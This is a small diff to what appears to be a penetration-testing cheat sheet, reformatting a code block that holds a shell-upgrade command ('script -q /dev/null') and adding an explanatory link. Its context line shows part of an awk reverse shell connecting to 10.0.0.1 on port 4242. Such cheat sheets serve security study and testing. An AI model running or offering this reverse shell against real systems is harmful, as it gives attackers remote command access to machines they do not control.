@@ -62,7 +62,9 @@ awk 'BEGIN {s = "/inet/tcp/0/10.0.0.1/4242"; while(42) { do{ printf "shell>" |& 
 
 ### SHELL COMMANDS
 
-```SHELL=/bin/bash script -q /dev/null```
+```SHELL
+SHELL=/bin/bash script -q /dev/null
+```
 
 Explanation for /dev/null
 https://askubuntu.com/questions/306047/what-does-the-script-dev-null-do
